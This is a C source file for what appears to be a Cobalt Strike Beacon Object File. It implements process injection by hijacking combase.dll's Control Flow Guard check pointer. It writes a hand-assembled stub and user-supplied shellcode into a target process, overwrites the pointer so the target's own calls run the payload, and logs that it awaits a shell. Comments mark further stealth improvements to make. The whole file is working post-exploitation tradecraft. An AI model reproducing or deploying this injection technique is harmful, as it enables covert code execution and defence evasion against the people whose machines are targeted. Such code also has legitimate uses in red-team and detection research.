#include <windows.h>
#include "beacon.h"

//
// Macros (I hate typing BeaconPrintf)
//
#define LOG_INFO(fmt, ...) ( BeaconPrintf(CALLBACK_OUTPUT, fmt, ##__VA_ARGS__) )
#define LOG_ERROR(fmt, ...) ( BeaconPrintf(CALLBACK_ERROR, fmt, ##__VA_ARGS__) )

//
// Prototypes
//
WINBASEAPI INT __cdecl MSVCRT$memcmp(const void *_Buf1, const void *_Buf2, size_t _Size);
WINBASEAPI void *__cdecl MSVCRT$memcpy(void *_Dst, const void *_Src, size_t _MaxCount);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpProcName);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
NTSYSAPI SIZE_T NTAPI NTDLL$RtlCompareMemory(const VOID *Source1, const VOID *Source2, SIZE_T Length);

PVOID EggHunt(_In_ PVOID RegionStart, _In_ SIZE_T RegionLength, _In_ PVOID Egg, _In_ SIZE_T EggLength);
void go(char *args, int alen);


//
// Search a region of memory for an egg. Returns NULL on failure.
//
PVOID EggHunt(_In_ PVOID RegionStart, _In_ SIZE_T RegionLength, _In_ PVOID Egg, _In_ SIZE_T EggLength)
{
    if (!RegionStart || !RegionLength || !Egg || !EggLength)
        return NULL;

    for (CHAR* pchar = (CHAR*)RegionStart; RegionLength >= EggLength; ++pchar, --RegionLength)
    {
        if (MSVCRT$memcmp(pchar, Egg, EggLength) == 0)
            return pchar;
    }
    return NULL;
}

void go(char *args, int alen)
{
    // param vars
    datap parser;
    INT pid;
    CHAR* shellcode;
    INT shellcode_len;

    // other vars
    HMODULE combase;
    FARPROC NdrProxyForwardingFunction13;
    BYTE egg[] = {
        0x4c, 0x8b, 0x11,
        0x49, 0x8b, 0x4a, 0x68,
        0xff, 0x15
    };
    BYTE* egg_start;
    BYTE* egg_end;
    DWORD offset;
    FARPROC* __guard_check_icall_fptr;
    HANDLE process = INVALID_HANDLE_VALUE;
    PVOID base_address;
    BYTE stub[] = {
        0x41,0x54,0x53,0x48,0x83,0xec,0x58,0x50,0x57,0x51,0x57,0x56,0x41,0x50,0x41,0x51,0x41,0x52,0x41,0x53,0x41,0x54,0x41,0x55,0x4c,0x8d,0x4c,0x24,0x4c,0xc7,0x44,0x24,0x4c,0x00,0x00,0x00,0x00,0xba,0x08,0x00,0x00,0x00,
        0x49,0xbc,
        0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,
        0x4c,0x89,0x4c,0x24,0x38,0x4c,0x89,0xe1,0x41,0xb8,0x04,0x00,0x00,0x00,0x48,0xbb,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0xff,0xd3,0x4c,0x8b,0x4c,0x24,0x38,0x44,0x8b,0x44,0x24,0x4c,0x4c,0x89,0xe1,0x48,0xb8,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0xba,0x08,0x00,0x00,0x00,0x49,0x89,0x04,0x24,0xff,0xd3,0xc7,0x44,0x24,0x20,0x00,0x00,0x00,0x00,0x45,0x31,0xc9,0x31,0xd2,0x48,0xc7,0x44,0x24,0x28,0x00,0x00,0x00,0x00,0x31,0xc9,0x49,0xb8,0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x48,0xb8,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0xff,0xd0,0x58,0x5f,0x59,0x5f,0x5e,0x41,0x58,0x41,0x59,0x41,0x5a,0x41,0x5b,0x41,0x5c,0x41,0x5d,0x48,0x83,0xc4,0x58,0x5b,0x41,0x5c,0xc3
    };
    SIZE_T bytes_written;
    HMODULE kernel32;
    FARPROC _VirtualProtect;
    FARPROC _CreateThread;
    BYTE* shellcode_address;
    DWORD old_prot;

    //
    // Parse command line arguments
    //
    BeaconDataParse(&parser, args, alen);
    pid = BeaconDataInt(&parser);
    shellcode = BeaconDataExtract(&parser, &shellcode_len);

    //
    // Resolve combase.dll!NdrProxyForwardingFunction13
    //
    combase = KERNEL32$LoadLibraryA("combase.dll");
    if (combase == NULL)
    {
        LOG_ERROR("Failed to load/resolve combase.dll via Kernel32!LoadLibraryA");
        return;
    }

    NdrProxyForwardingFunction13 = KERNEL32$GetProcAddress(combase, "NdrProxyForwardingFunction13");
    if (NdrProxyForwardingFunction13 == NULL)
    {
        LOG_ERROR("Failed to resolve combase.dll!NdrProxyForwardingFunction13 via Kernel32!GetProcAddress");
        return;
    }

    //
    // Egghunt for "call qword [rel __guard_check_icall_fptr]" instruction.
    //
    // mov     r10, qword [rcx]
    // mov     rcx, qword [r10+0x68]
    // call    qword [rel __guard_check_icall_fptr]  {_guard_check_icall_nop}
    // next 4 bytes are the offset
    egg_start = (BYTE*)EggHunt(NdrProxyForwardingFunction13, 256, egg, sizeof(egg));
    if (egg_start == NULL)
    {
        LOG_ERROR("Failed to locate __guard_check_icall_fptr call offset @ combase.dll!NdrProxyForwardingFunction13");
        return;
    }
    egg_end = egg_start + sizeof(egg);

    //
    // Get the offset to __guard_check_icall_fptr located at the end of the egg.
    //
    offset = *(DWORD*)egg_end;

    //
    // Resolve __guard_check_icall_fptr and subsequently _guard_check_icall_nop using offset.
    //
    __guard_check_icall_fptr = (FARPROC*)(egg_end + offset + sizeof(DWORD));

    //
    // Check that the pointer is correct
    // note: likely worth checking whether __guard_check_icall_fptr is within the .rdata section of combase.dll before dereferencing.
    // note2: compiler somehow decides this is always hit?
    //if (*(BYTE*)orig_guard_check_icall_nop != '\xc2')
    //{
    //    LOG_ERROR("Failed to resolve combase.dll!__guard_check_icall_fptr");
    //    return;
    //}

    //
    // Open handle to target process
    //
    process = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
    if (process == NULL)
    {
        LOG_ERROR("Failed to open handle to target process (pid: %d). Are you sure it is correct?", pid);
        return;
    }

    //
    // Allocate memory for shellcode
    // TODO: use something more stealthy than VirtualAllocEx->WriteProcessMemory
    //
    base_address = KERNEL32$VirtualAllocEx(process, NULL, shellcode_len + 0xc0, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (base_address == NULL)
    {
        LOG_ERROR("Failed to allocate memory for shellcode in target process via Kernel32!VirtualAllocEx");
        goto CLEANUP;
    }

    //
    // Modify placeholder values in shellcode stub.
    //
    kernel32 = KERNEL32$GetModuleHandleA("KERNEL32.DLL");
    _VirtualProtect = KERNEL32$GetProcAddress(kernel32, "VirtualProtect");
    _CreateThread = KERNEL32$GetProcAddress(kernel32, "CreateThread");
    shellcode_address = base_address + 0xc0;
    MSVCRT$memcpy(stub + 44, &__guard_check_icall_fptr, sizeof(FARPROC*));
    MSVCRT$memcpy(stub + 68, &_VirtualProtect, sizeof(FARPROC));
    MSVCRT$memcpy(stub + 93, __guard_check_icall_fptr, sizeof(FARPROC));
    MSVCRT$memcpy(stub + 138, &shellcode_address, sizeof(FARPROC));
    MSVCRT$memcpy(stub + 148, &_CreateThread, sizeof(FARPROC));

    //
    // Write stub & shellcode to allocated memory and change protections from RW -> RX
    // TODO: like before, this could be stealthier (e.g. using a code cave)
    //
    if (!KERNEL32$WriteProcessMemory(process, base_address, stub, sizeof(stub), &bytes_written))
    {
        if (bytes_written < sizeof(stub))
        {
            LOG_ERROR("Kernel32!WriteProcessMemory performed only a partial shellcode stub write. Stopping to prevent crashes.");
            goto CLEANUP;
        }
        LOG_ERROR("Failed to write shellcode stub to target process memory via Kernel32!WriteProcessMemory. Perhaps the process closed?");
        goto CLEANUP;
    }

    if (!KERNEL32$WriteProcessMemory(process, shellcode_address, shellcode, shellcode_len, &bytes_written))
    {
        if (bytes_written < shellcode_len)
        {
            LOG_ERROR("Kernel32!WriteProcessMemory performed only a partial shellcode write. Stopping to prevent crashes.");
            goto CLEANUP;
        }
        LOG_ERROR("Failed to write shellcode to target process memory via Kernel32!WriteProcessMemory. Perhaps the process closed?");
        goto CLEANUP;
    }
    
    if (!KERNEL32$VirtualProtectEx(process, base_address, shellcode_len + 0xc0, PAGE_EXECUTE_READ, &old_prot))
    {
        LOG_ERROR("Failed to change allocated shellcode memory permissions from RW->RX via Kernel32!VirtualProtectEx");
        goto CLEANUP;
    }

    //
    // Overwrite __guard_check_icall_fptr with shellcode pointer.
    //
    if (!KERNEL32$VirtualProtectEx(process, __guard_check_icall_fptr, sizeof(FARPROC), PAGE_READWRITE, &old_prot))
    {
        LOG_ERROR("Failed to change combase.dll!.rdata memory permissions from R->RW via Kernel32!VirtualProtectEx");
        goto CLEANUP;
    }

    if (!KERNEL32$WriteProcessMemory(process, __guard_check_icall_fptr, &base_address, sizeof(PVOID), &bytes_written))
    {
        if (bytes_written < shellcode_len)
        {
            LOG_ERROR("Kernel32!WriteProcessMemory performed only a partial pointer write. Stopping to prevent crashes.");
            goto CLEANUP;
        }
        LOG_ERROR("Failed to overwrite combase.dll!__guard_check_icall_fptr with shellcode pointer via Kernel32!WriteProcessMemory. Perhaps the process closed?");
        goto CLEANUP;
    }
    LOG_INFO("Successfully overwritten combase.dll!__guard_check_icall_fptr. Now to wait for a shell :)");

    if (!KERNEL32$VirtualProtectEx(process, __guard_check_icall_fptr, sizeof(FARPROC), old_prot, &old_prot))
    {
        LOG_ERROR("Failed to restore combase.dll!.rdata memory permissions from RW->R via Kernel32!VirtualProtectEx");
        goto CLEANUP;
    }
    
CLEANUP:
    KERNEL32$CloseHandle(process);
}